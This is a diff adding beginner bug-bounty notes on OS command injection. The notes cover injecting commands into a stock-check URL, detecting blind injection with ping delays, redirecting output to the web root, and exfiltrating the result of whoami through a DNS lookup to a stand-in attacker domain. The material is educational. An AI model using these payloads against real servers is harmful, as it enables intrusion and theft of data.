@@ -1,0 +1,74 @@
+## OS command injection: 
+
+OS command injection is a web security vulnrablity in which an attacker is able to 
+execute arbitrary OS commands on the server and let's say is able to fully compromise 
+the entire web application server.
+
+## Executing arbitrary commands:
+
+Suppose, you visited a website and tried to view that any product is in stock or not!
+
+> url for that task will be: https://insecure-website.com/stockStatus?productID=381&storeID=29
+
+on backend a shell command gets executed for the above url something like this: 
+---
+> stockreport.pl 381 29 : this echoes the latest stock report from the backend
+
+there is no defense so you can inject a simple os command injection here: 
+
+> i.e: productID=381&whoami&storeID=2
+
+## How mail services are used by the websites: 
+now a days websites uses mail-services to get the feedback from their customers.
+for that the mail-service run a command in the backend to recieve the email from customers: 
+
+> i.e: $ mail -s 'this is the body of mail in string' -aFrom:user@email.com feedback@email.com
+
+the above case in intresting because there is no output is getting back from this service 
+so our silly os commands won't work here.
+
+### how to detect blind os command injections: 
+any command which will eventually trigger time delay will work here 
+
+for example : ping command which sends `ICMP` packets to the web server
+
+> i.e:  ping -c 10 127.0.0.1  : here flag(-c) means stop after
+
+the above command will make the vulnrable web application ping its loopback address for 10 seconds.
+
+but this won't give you any bounty and your report will be rejected with a comment 
+`this bug is lacking any bussiness impact please make a POC with an impact`
+
+#Exploiting blind OS command injection by redirecting output:
+as we know that blind injection can't give you any output 
+but we can save it somewhere on the web server and make it retrive later
+
+> i.e: whoami > /somewhere/on/the/webserver/whoami.txt
+
+
+
+## fun part beings here: aka out of band interaction-
+
+> i.e : nslookup attacker-website.net 
+
+`the command nslookup will trigger a DNS interaction to the attacker controlled webserver`
+
+
+## the most advance and hard part is out of band data exfiltration:
+```
+a little shell command knowledge: what is the use of backtick in shell?
+
+   $ sudo chown `id -u` /somedir
+
+The backtick `…` is actually called command substitution. 
+The purpose of command substitution is to evaluate the command which is 
+placed inside the backtick and provide its result as an argument to the actual command.
+
+The command substitution can be done in two ways one is using $(…) and the other is `…`. 
+Both work same, but the $(…) form is the modern way and has more clarity and readability.
+```
+
+so if you triggered any DNS interaction then the step 2 will be data exfiltration:
+for that use command someting like 
+
+> i.e: ||nslookup `whoami`.attackerwebsite.com||
